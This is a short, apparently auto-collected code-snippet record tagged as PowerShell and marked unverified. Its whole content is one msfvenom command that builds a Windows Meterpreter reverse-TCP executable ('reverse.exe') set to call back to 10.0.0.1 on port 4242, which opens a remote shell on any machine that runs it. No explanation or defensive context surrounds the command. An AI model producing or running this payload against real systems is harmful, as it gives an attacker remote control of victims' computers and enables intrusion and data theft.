---
id: 03d05fe5-6e18-44d2-8871-c7a7ca062f0c
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.811586+00:00'
updated_at: '2023-04-10T20:25:22.103475+00:00'
---

# Code Snippet 03d05fe5

**Language**: Powershell

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```
